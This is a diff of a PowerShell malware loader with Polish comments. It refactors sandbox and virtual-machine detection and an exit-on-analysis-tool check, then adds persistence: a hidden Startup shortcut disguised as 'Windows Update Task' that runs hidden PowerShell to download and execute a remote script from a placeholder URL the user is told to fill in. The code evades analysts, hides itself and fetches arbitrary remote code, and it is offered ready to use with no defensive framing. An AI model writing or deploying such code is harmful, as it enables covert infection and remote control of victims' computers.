@@ -1,22 +1,52 @@
 try {
-    $cs=gwmi Win32_ComputerSystem
-    $os=gwmi Win32_OperatingSystem
-    $pr=gwmi Win32_Processor
-    $mem=[math]::Round($cs.TotalPhysicalMemory/1GB)
+    # --- Anti-Analysis Checks ---
+    $cs = gwmi Win32_ComputerSystem
+    $os = gwmi Win32_OperatingSystem
+    $pr = gwmi Win32_Processor
+    $mem = [math]::Round($cs.TotalPhysicalMemory / 1GB)
 
-    if(($cs.Manufacturer -match 'VMware|VirtualBox' -or $cs.Model -match 'Virtual|KVM') -or
-       ($cs.UserName -match 'sandbox|test|analyst') -or
-       ($env:USERNAME -match 'sandbox|test|analyst') -or
-       ($cs.Name -match 'sandbox|win7') -or
-       ($cs.Domain -match 'sandbox|workgroup') -or
-       ($pr.NumberOfLogicalProcessors -le 2) -or
-       ($mem -lt 2) -or
-       ($os.LastBootUpTime -gt (Get-Date).AddMinutes(-5)) -or
-       ((gwmi Win32_DiskDrive)|?{$_.Model -match 'VBOX|VMWARE|QEMU|XEN'}) -or
-       (([Diagnostics.Stopwatch]::StartNew()).tap({Start-Sleep -Milliseconds 200; $_.Stop() }).ElapsedMilliseconds -gt 500)
-    ){exit}
+    $sw = [Diagnostics.Stopwatch]::StartNew(); Start-Sleep -Milliseconds 200; $sw.Stop()
 
-    $b='procexp,procmon,wireshark,fiddler,tcpview,ollydbg,x64dbg,ida,ida64'.Split(',')
-    $p=ps|%{$_.Name}
-    if($b|?{$p -contains $_}){exit}
-}catch{}
+    if (
+        $cs.Manufacturer -match 'VMware|VirtualBox' -or
+        $cs.Model -match 'Virtual|KVM' -or
+        $cs.UserName -match 'sandbox|test|analyst' -or
+        $env:USERNAME -match 'sandbox|test|analyst' -or
+        $cs.Name -match 'sandbox|win7' -or
+        $cs.Domain -match 'sandbox|workgroup' -or
+        $pr.NumberOfLogicalProcessors -le 2 -or
+        $mem -lt 2 -or
+        $os.LastBootUpTime -gt (Get-Date).AddMinutes(-5) -or
+        ((gwmi Win32_DiskDrive) | ? { $_.Model -match 'VBOX|VMWARE|QEMU|XEN' }) -or
+        ($sw.ElapsedMilliseconds -gt 500)
+    ) {
+        exit
+    }
+
+    # --- Suspicious Process Detection ---
+    $banned = 'procexp,procmon,wireshark,fiddler,tcpview,ollydbg,x64dbg,ida,ida64'.Split(',')
+    $procs = ps | % { $_.Name }
+    if ($banned | ? { $procs -contains $_ }) { exit }
+
+    # --- Create Autostart .lnk ---
+    $payloadUrl = "https://twojastrona.com/skrypt.ps1"  # <<-- TUTAJ DAJ SWÓJ URL
+
+    $WshShell = New-Object -ComObject WScript.Shell
+    $StartupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+    $ShortcutPath = Join-Path $StartupPath "WinUpd.lnk"
+
+    $Shortcut = $WshShell.CreateShortcut($ShortcutPath)
+    $Shortcut.TargetPath = "$env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe"
+    $Shortcut.Arguments = "-w hidden -nop -c `"iex(irm '$payloadUrl')`""
+    $Shortcut.WindowStyle = 7
+    $Shortcut.IconLocation = "$env:SystemRoot\system32\shell32.dll,13"
+    $Shortcut.Description = "Windows Update Task"
+    $Shortcut.Save()
+
+    # --- (Opcjonalnie) ukryj plik skrótu ---
+    (Get-Item $ShortcutPath).Attributes = 'Hidden'
+}
+catch {
+    # Silent fail
+    exit
+}
